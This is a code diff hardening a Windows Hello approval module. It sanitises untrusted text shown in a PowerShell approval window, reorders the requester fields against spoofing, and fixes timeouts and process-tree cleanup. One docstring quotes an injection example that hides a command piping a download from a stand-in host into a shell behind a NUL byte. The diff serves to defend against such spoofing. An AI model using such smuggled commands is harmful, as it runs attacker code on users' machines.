@@ -6,9 +6,9 @@ agent on this machine can ask for a signature; it cannot complete one. This
 module is the Windows half of that: it enrols a TPM-backed key with
 `KeyCredentialManager`, signs a challenge with it, and shows collab's own
 approval window, the front door a human starts each approval from. The proof is
-the gesture, verified by the hub against the key enrolled for this participant
-(the hub's verifier is R22b-core's); `verify` here is the same check, for a
-local self-test.
+the gesture: THE HUB verifies every signature against the key enrolled for
+this participant before anything acts on it (the hub's verifier is
+R22b-core's); `verify` here is the same check, for a local self-test only.
 
 VERIFIED BY EXECUTION, with the user making the gestures (2026-11-14,
 .claude/r22b-strong-approval-design.md):
@@ -71,6 +71,12 @@ OUTPUT_CAP = 64 * 1024
 QUICK = 15.0
 HUMAN = 120.0
 
+#: How long the approval window may stay open. Reading a long review is
+#: slower than making a gesture, and a window that closed itself mid-read
+#: would teach a human to approve quickly. Ten minutes; then the request
+#: EXPIRES — never «declined», which would be a decision nobody made.
+WINDOW_DEADLINE = 600.0
+
 #: The largest review the window is handed. The canonical review is built by
 #: the hub; this is the bound on what reaches the dialog however it was built.
 REVIEW_MAX = 64 * 1024
@@ -126,13 +132,19 @@ try {
     $f.StartPosition = 'CenterScreen'
     $f.Size = New-Object Drawing.Size(760, 600)
     $f.MinimizeBox = $false
-    $who = New-Object Windows.Forms.Label
-    $who.Text = $req.who
-    $who.Font = New-Object Drawing.Font('Segoe UI', 11, [Drawing.FontStyle]::Bold)
-    $who.SetBounds(12, 10, 720, 26)
+    $id = New-Object Windows.Forms.Label
+    $id.Text = $req.requester
+    $id.AutoEllipsis = $true
+    $id.Font = New-Object Drawing.Font('Segoe UI', 11, [Drawing.FontStyle]::Bold)
+    $id.SetBounds(12, 8, 720, 24)
+    $name = New-Object Windows.Forms.Label
+    $name.Text = $req.name
+    $name.AutoEllipsis = $true
+    $name.SetBounds(12, 34, 720, 20)
     $what = New-Object Windows.Forms.Label
     $what.Text = $req.summary
-    $what.SetBounds(12, 40, 720, 40)
+    $what.AutoEllipsis = $true
+    $what.SetBounds(12, 58, 720, 20)
     $box = New-Object Windows.Forms.TextBox
     $box.Multiline = $true
     $box.ReadOnly = $true
@@ -141,6 +153,7 @@ try {
     $box.Font = New-Object Drawing.Font('Consolas', 10)
     $box.Text = $req.review
     $box.SetBounds(12, 84, 720, 410)
+    $box.MaxLength = 0
     $script:choice = 'decline'
     $ok = New-Object Windows.Forms.Button
     $ok.Text = 'Approve with Windows Hello'
@@ -154,9 +167,11 @@ try {
     $pk.Text = 'Use a passkey instead'
     $pk.SetBounds(522, 505, 210, 36)
     $pk.Add_Click({ $script:choice = 'passkey'; $f.Close() })
-    $f.Controls.AddRange(@($who, $what, $box, $ok, $no, $pk))
+    $f.Controls.AddRange(@($id, $name, $what, $box, $ok, $no, $pk))
     $f.CancelButton = $no
+    $f.AcceptButton = $no
     $f.Add_Shown({ $f.Activate(); $no.Focus() })
+    if ($req.dry) { $f.Dispose(); Say @{status = 'Success'; choice = 'built'}; exit 0 }
     [void]$f.ShowDialog()
     Say @{status = 'Success'; choice = $script:choice}
     exit 0
@@ -238,14 +253,20 @@ def _run(request: dict, deadline: float) -> dict:
     process group is ended first — and `HelloError("BadAnswer")` for anything
     that is not one JSON object.
     """
+    # THE CLOCK STARTS HERE, before the process exists and before anything is
+    # written to it. Started after a blocking stdin write, a child that never
+    # read its stdin held the caller for as long as the pipe stayed full —
+    # measured at 30 s against a 2 s deadline.
+    end = time.monotonic() + deadline
     exe = _powershell()
     if exe is None:
         raise Unavailable("NoPowerShell")
     line = base64.b64encode(json.dumps(request).encode("utf-8")) + b"\n"
+    group = ({"start_new_session": True} if os.name == "posix"
+             else {"creationflags": getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0)})
     try:
         proc = subprocess.Popen(_command(exe), stdin=subprocess.PIPE,
-                                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
-                                start_new_session=True)
+                                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, **group)
     except OSError as exc:
         raise Unavailable(type(exc).__name__) from None
     got = bytearray()
@@ -263,38 +284,63 @@ def _run(request: dict, deadline: float) -> dict:
                 return
             got.extend(chunk)
 
+    def write() -> None:
+        try:
+            assert proc.stdin is not None
+            proc.stdin.write(line)
+            proc.stdin.close()
+        except (OSError, ValueError):
+            pass
+
     reader = threading.Thread(target=read, daemon=True, name="collab-hello-read")
+    writer = threading.Thread(target=write, daemon=True, name="collab-hello-write")
     reader.start()
+    writer.start()
     try:
-        assert proc.stdin is not None
-        proc.stdin.write(line)
-        proc.stdin.close()
-    except OSError:
-        pass
-    end = time.monotonic() + deadline
-    while reader.is_alive() and not over.is_set() and time.monotonic() < end:
-        reader.join(0.05)
-    if reader.is_alive() or over.is_set():
-        _end_group(proc)
-        reader.join(1.0)
-        raise HelloError("OutputTooLarge" if over.is_set() else "Timeout")
-    try:
-        proc.wait(max(0.1, end - time.monotonic()))
-    except subprocess.TimeoutExpired:
-        _end_group(proc)
-    return _answer(bytes(got))
+        while reader.is_alive() and not over.is_set() and time.monotonic() < end:
+            reader.join(0.05)
+        if reader.is_alive() or over.is_set():
+            _end_group(proc)
+            reader.join(1.0)
+            raise HelloError("OutputTooLarge" if over.is_set() else "Timeout")
+        try:
+            proc.wait(max(0.1, end - time.monotonic()))
+        except subprocess.TimeoutExpired:
+            _end_group(proc)
+        return _answer(bytes(got))
+    finally:
+        for pipe in (proc.stdout, proc.stdin):
+            try:
+                if pipe is not None:
+                    pipe.close()
+            except (OSError, ValueError):
+                pass
 
 
 def _end_group(proc: subprocess.Popen) -> None:
-    """End the call's own process group — powershell.exe and anything it
-    started — then reap. Only this process's group, never a name match."""
+    """End the call's own process tree — powershell.exe and anything it
+    started — then reap. Only this process's own tree, never a name match.
+
+    POSIX (WSL): the process group the call was started in. Native Windows
+    has no process groups to signal and no `os.killpg`: `taskkill /T /F` on
+    the call's own pid ends its tree. Anything that fails here is caught —
+    an exception on the kill path would leave the process running AND lose
+    the timeout it was ending."""
     try:
-        os.killpg(proc.pid, signal.SIGKILL)
-    except (ProcessLookupError, PermissionError):
-        pass
+        if os.name == "posix":
+            os.killpg(proc.pid, signal.SIGKILL)
+        else:
+            subprocess.run(["taskkill", "/T", "/F", "/PID", str(proc.pid)],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                           timeout=5, check=False)
+    except Exception:                                         # noqa: BLE001
+        try:
+            proc.kill()
+        except Exception:                                     # noqa: BLE001
+            pass
     try:
         proc.wait(2)
-    except subprocess.TimeoutExpired:
+    except Exception:                                         # noqa: BLE001
         pass
 
 
@@ -396,26 +442,56 @@ def verify(spki_der: bytes, message: bytes, signature: bytes) -> bool:
 
 # --- the approval window ------------------------------------------------------------
 
-def summary(request: dict) -> tuple[str, str]:
-    """The two lines above the review: who asks, and what for, in one line
-    each — subject, destination, authority and the digest's first 16 hex."""
-    who = (f"{_clean(request.get('requester_name'), 60)} "
-           f"({_clean(request.get('requester_id'), 40)}) asks for approval")
-    what = (f"{_clean(request.get('subject'), 60)} → {_clean(request.get('destination'), 60)}"
-            f" · grants {_clean(request.get('authority'), 60)}"
-            f" · digest {_clean(request.get('digest_hex'), 16)}")
-    return who, what
+def _visible(text: Any, *, lines: bool) -> str:
+    """Text a remote party chose, made to show what it IS.
+
+    Every control and format character becomes a visible `\\u{XXXX}`: C0/C1
+    controls, NUL among them — WinForms stops drawing a TextBox at a NUL, so
+    «make test\\0; curl evil | sh» showed only «make test» — the bidi
+    overrides and isolates (U+202A–202E, U+2066–2069) that reorder what is
+    drawn, zero-width characters, the BOM, line and paragraph separators, and
+    unpaired surrogates. `lines` keeps tab, CR and LF, for the review box.
+    """
+    import unicodedata
+
+    out = []
+    for c in "" if text is None else str(text):
+        if lines and c in "\t\r\n":
+            out.append(c)
+        elif unicodedata.category(c) in ("Cc", "Cf", "Cs", "Co", "Cn", "Zl", "Zp"):
+            out.append(f"\\u{{{ord(c):04X}}}")
+        else:
+            out.append(c)
+    return "".join(out)
 
 
-def _clean(value: Any, limit: int) -> str:
-    """One line of something a remote party chose: no control characters, no
-    newlines that would let it draw a second «summary» line, bounded."""
-    text = "" if value is None else str(value)
-    text = "".join(c if c.isprintable() else " " for c in text)
-    return text[:limit] or "?"
+def _line(value: Any, limit: int) -> str:
+    """One line of a remote party's text: visible, single-line, bounded."""
+    text = _visible(value, lines=False)
+    return (text[:limit] + "…") if len(text) > limit else (text or "?")
 
 
-def open(request: dict) -> dict:                               # noqa: A001
+def fields(request: dict) -> dict:
+    """What the window's three lines say.
+
+    THE HUB-ASSIGNED ID FIRST, on its own line: a requester's NAME is its own
+    choice, and one chosen to read «alice (p_alice) asks for approval ⸻…»
+    pushed the real id off a wrapped label. The name comes second, marked as
+    self-chosen; the third line is subject, destination, authority and the
+    digest's first 16 hex.
+    """
+    return {
+        "requester": f"Requester: {_line(request.get('requester_id'), 64)}"
+                     "  — participant id, assigned by the hub",
+        "name": f"Calls itself: {_line(request.get('requester_name'), 64)}  (self-chosen)",
+        "summary": (f"{_line(request.get('subject'), 60)} → "
+                    f"{_line(request.get('destination'), 60)}"
+                    f" · grants {_line(request.get('authority'), 60)}"
+                    f" · digest {_line(request.get('digest_hex'), 16)}"),
+    }
+
+
+def open_window(request: dict) -> dict:
     """Show collab's approval window for `request`, and act on the choice.
 
     `request` is the dispatcher's (`consent.window.open`): request_id,
@@ -425,47 +501,71 @@ def open(request: dict) -> dict:                               # noqa: A001
         {"choice": "approve", "method": "hello", "cred_id", "signature_b64"}
         {"choice": "decline"}
         {"choice": "passkey"}           — the dispatcher opens the passkey page
+        {"choice": "expired"}           — nobody chose within WINDOW_DEADLINE
         {"choice": "unavailable", "reason"}
 
     Approve is the human's click AND the Hello gesture: the signature is made
-    only after both, and a cancelled gesture is a decline. The window shows the
-    review as untrusted text; the Hello dialog that follows shows none.
+    only after both, a cancelled gesture is a decline, and the HUB verifies the
+    signature against the key enrolled for this participant before anything
+    acts on it. The window shows the review as untrusted text; the Hello dialog
+    that follows shows none. Nothing of the review is logged.
     """
-    who, what = summary(request)
-    review = str(request.get("review_text") or "")
+    # VALIDATED BEFORE THE WINDOW: a request that could not be signed must not
+    # ask a human to read and approve it first.
+    cred = request.get("cred_id")
+    try:
+        _name(cred)
+        challenge = base64.b64decode(str(request.get("challenge_b64") or ""), validate=True)
+        if not 1 <= len(challenge) <= 4096:
+            raise ValueError("challenge size")
+    except (ValueError, TypeError):
+        return {"choice": "unavailable", "reason": "BadRequest"}
+    review = _visible(request.get("review_text"), lines=True)
     if len(review) > REVIEW_MAX:
         review = review[:REVIEW_MAX] + "\n… [the review is longer than the window shows]"
     review = ("UNTRUSTED — this is what the requester sent, shown as text:\n\n"
               + review.replace("\r\n", "\n").replace("\n", "\r\n"))
     try:
-        choice = _checked(_run({"op": "window", "who": who, "summary": what,
-                                "review": review}, HUMAN)).get("choice")
+        answer = _run({"op": "window", **fields(request), "review": review},
+                      WINDOW_DEADLINE)
+        choice = _checked(answer).get("choice")
     except Unavailable as exc:
         return {"choice": "unavailable", "reason": exc.status}
     except HelloError as exc:
-        # A window that timed out or broke is no approval.
-        return {"choice": "decline", "reason": exc.status}
+        if exc.status == "Timeout":
+            return {"choice": "expired"}
+        # The window could not be shown — WinForms failed, PowerShell broke:
+        # nothing was decided, so nothing is declined.
+        return {"choice": "unavailable", "reason": exc.status}
     if choice == "passkey":
         return {"choice": "passkey"}
     if choice != "approve":
         return {"choice": "decline"}
-    cred = str(request.get("cred_id") or "")
     try:
-        challenge = base64.b64decode(str(request.get("challenge_b64") or ""), validate=True)
         signature = sign(cred, challenge)
     except Refused:
         return {"choice": "decline", "reason": "Refused"}
     except NotEnrolled:
         return {"choice": "unavailable", "reason": "NotEnrolled"}
-    except (HelloError, ValueError) as exc:
-        return {"choice": "unavailable",
-                "reason": getattr(exc, "status", type(exc).__name__)}
+    except HelloError as exc:
+        if exc.status == "Timeout":
+            return {"choice": "expired"}
+        return {"choice": "unavailable", "reason": exc.status}
     return {"choice": "approve", "method": "hello", "cred_id": cred,
             "signature_b64": base64.b64encode(signature).decode("ascii")}
 
 
+def build_window_only(request: dict) -> dict:
+    """Build the window with this request's text and dispose of it unshown —
+    a real check of the WinForms code that raises nothing on the screen."""
+    return _checked(_run({"op": "window", "dry": True, **fields(request),
+                          "review": _visible(request.get("review_text"), lines=True)},
+                         QUICK))
+
+
 __all__ = ["AlreadyEnrolled", "HelloError", "NotEnrolled", "Refused", "Unavailable",
-           "available", "enrol", "open", "public_key", "sign", "summary", "verify"]
+           "available", "build_window_only", "enrol", "fields", "open_window",
+           "public_key", "sign", "verify"]
 
 
 def _self_check(name: str = "collab-selftest") -> None:      # pragma: no cover
